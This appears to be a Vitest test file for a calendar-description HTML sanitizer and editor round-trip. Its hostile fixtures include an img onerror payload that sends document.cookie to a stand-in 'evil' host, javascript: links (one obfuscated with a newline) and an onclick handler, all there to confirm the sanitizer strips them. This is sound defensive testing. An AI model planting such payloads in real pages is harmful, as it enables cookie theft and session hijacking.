// @vitest-environment jsdom
import { setEditorStateFromHtml } from '@core/component/LexicalMarkdown/utils';
import { HtmlRenderNode, RegisteredNodesByType } from '@macro-inc/lexical-core';
import { createEditor } from 'lexical';
import { describe, expect, it, vi } from 'vitest';
import {
  calendarDescriptionToEditorHtml,
  exportCalendarDescription,
  parseMacroAppLink,
  sanitizeCalendarDescription,
} from './calendar-description';

// The editor utilities pull in the plugin barrel, whose leaves open the
// storage and connection-gateway sockets on import.
vi.mock('@service-storage/websocket', () => ({
  storageWS: { reconnectIfDisconnected: vi.fn() },
  createWebSocketJob: vi.fn(),
}));
vi.mock('@service-connection/websocket', () => ({
  ws: { addEventListener: vi.fn(), send: vi.fn() },
  state: () => 'closed',
  createConnectionBlockWebsocketEffect: vi.fn(),
  createConnectionWebsocketEffect: vi.fn(),
}));

const DOCUMENT_ID = '60617ec4-4c58-4e8b-90c6-445aa3172713';

function makeEditor() {
  return createEditor({
    nodes: RegisteredNodesByType.calendar,
    onError: (error) => {
      throw error;
    },
  });
}

describe('sanitizeCalendarDescription', () => {
  it('keeps plain provider text readable, line breaks included', () => {
    expect(sanitizeCalendarDescription('Sync with the design team')).toBe(
      '<p>Sync with the design team</p>'
    );
    expect(sanitizeCalendarDescription('line one\nline two')).toBe(
      '<p>line one<br>line two</p>'
    );
    expect(sanitizeCalendarDescription('   ')).toBe('');
  });

  it('keeps angle brackets in plain text as text', () => {
    const safe = sanitizeCalendarDescription(
      'Send the agenda to <bob@example.com>\nOwner: <TBD>'
    );
    expect(safe).toBe(
      '<p>Send the agenda to &lt;bob@example.com&gt;<br>Owner: &lt;TBD&gt;</p>'
    );
    // Already-safe output must not change on the next pass.
    expect(sanitizeCalendarDescription(safe)).toBe(safe);
  });

  it('decodes provider-escaped entities in plain text', () => {
    expect(sanitizeCalendarDescription('Tom &amp; Jerry &lt;3')).toBe(
      '<p>Tom &amp; Jerry &lt;3</p>'
    );
  });

  it('reduces provider html to the portable subset', () => {
    expect(
      sanitizeCalendarDescription(
        'Agenda:<br>- one<br><a href="https://example.com/notes" target="_blank" style="color:red">notes</a>'
      )
    ).toBe(
      '<p>Agenda:<br>- one<br><a href="https://example.com/notes">notes</a></p>'
    );
    expect(
      sanitizeCalendarDescription(
        '<div>first</div><div><b>second</b></div><ul><li>item</li></ul>'
      )
    ).toBe('<p>first</p><p><b>second</b></p><ul><li>item</li></ul>');
  });

  it("strips the editor's own theme classes and styles", () => {
    expect(
      sanitizeCalendarDescription(
        '<p class="my-4 first:mt-1.5 md-p" dir="ltr"><span style="white-space: pre-wrap;">hello</span></p>'
      )
    ).toBe('<p>hello</p>');
  });

  it('removes html-render markers and active content', () => {
    const hostile =
      '<div class="macro_html_render" data-html-render="true"><img src="x" onerror="fetch(\'//evil/\'+document.cookie)"><template shadowrootmode="open"><script>1</script></template></div><p onclick="steal()">hi</p>';
    const safe = sanitizeCalendarDescription(hostile);
    expect(safe).toBe('<p>hi</p>');
    expect(safe).not.toMatch(
      /onerror|onclick|img|script|html_render|html-render/
    );
  });

  it('drops links with unsafe schemes but keeps their text', () => {
    expect(
      sanitizeCalendarDescription(
        '<p><a href="javascript:alert(1)">click</a> <a href="  java\nscript:alert(1)">me</a></p>'
      )
    ).toBe('<p>click me</p>');
  });

  it('keeps mention display text without identity attributes', () => {
    const safe = sanitizeCalendarDescription(
      '<p>ping <span data-user-mention="true" data-user-id="macro|auth0|u_123" data-email="teo@macro.com" data-display-name="Teo Nys">Teo Nys</span>' +
        ' re <span data-contact-mention="true" data-contact-id="c_456" data-email-or-domain="glycotech.com" data-is-company="true">GlycoTech</span></p>'
    );
    expect(safe).toBe('<p>ping Teo Nys re GlycoTech</p>');
  });
});

describe('calendarDescriptionToEditorHtml', () => {
  it('marks Macro links so the editor rehydrates mention pills', () => {
    const html = calendarDescriptionToEditorHtml(
      `<p>Review <a href="${window.location.origin}/app/md/${DOCUMENT_ID}">August Cycle Planning</a> and <a href="https://example.com/x">the brief</a></p>`
    );
    const body = new DOMParser().parseFromString(html, 'text/html').body;
    const [mention, external] = Array.from(body.querySelectorAll('a'));
    expect(mention.getAttribute('data-document-mention')).toBe('true');
    expect(mention.getAttribute('data-document-id')).toBe(DOCUMENT_ID);
    expect(mention.getAttribute('data-block-name')).toBe('md');
    expect(mention.getAttribute('data-document-name')).toBe(
      'August Cycle Planning'
    );
    expect(external.hasAttribute('data-document-mention')).toBe(false);
  });

  it('only recognizes app links on Macro origins', () => {
    expect(
      parseMacroAppLink(`https://evil.example/app/md/${DOCUMENT_ID}`)
    ).toBeUndefined();
    expect(
      parseMacroAppLink(`https://macro.com/app/task/${DOCUMENT_ID}`)
    ).toEqual({ blockName: 'task', documentId: DOCUMENT_ID });
    expect(parseMacroAppLink('not a url')).toBeUndefined();
  });
});

describe('exportCalendarDescription', () => {
  it('exports an empty editor as an empty description', () => {
    const editor = makeEditor();
    setEditorStateFromHtml(editor, '<p></p>');
    expect(exportCalendarDescription(editor)).toBe('');
  });

  it('exports portable html with mentions reduced to text and links', () => {
    const editor = makeEditor();
    setEditorStateFromHtml(
      editor,
      `<p>ping <span data-user-mention="true" data-user-id="macro|auth0|u_123" data-email="teo@macro.com" data-display-name="Teo Nys">Teo Nys</span>` +
        ` about <span data-document-mention="true" data-document-id="${DOCUMENT_ID}" data-document-name="August Cycle Planning" data-block-name="md">August Cycle Planning</span></p>`
    );
    expect(exportCalendarDescription(editor)).toBe(
      `<p>ping Teo Nys about <a href="${window.location.origin}/app/md/${DOCUMENT_ID}">August Cycle Planning</a></p>`
    );
  });

  it('is stable across a load and export round trip', () => {
    const stored = `<p>Agenda:<br>- one</p><ul><li>item <a href="${window.location.origin}/app/md/${DOCUMENT_ID}">Plan</a></li></ul>`;
    const first = makeEditor();
    setEditorStateFromHtml(first, calendarDescriptionToEditorHtml(stored));
    const exported = exportCalendarDescription(first);

    const second = makeEditor();
    setEditorStateFromHtml(second, calendarDescriptionToEditorHtml(exported));
    expect(exportCalendarDescription(second)).toBe(exported);
  });

  it('never carries a raw-html node', () => {
    expect(RegisteredNodesByType.calendar).not.toContain(HtmlRenderNode);
    const editor = makeEditor();
    setEditorStateFromHtml(
      editor,
      calendarDescriptionToEditorHtml(
        '<div class="macro_html_render"><img src="x" onerror="1"></div><p>safe</p>'
      )
    );
    expect(exportCalendarDescription(editor)).toBe('<p>safe</p>');
  });
});
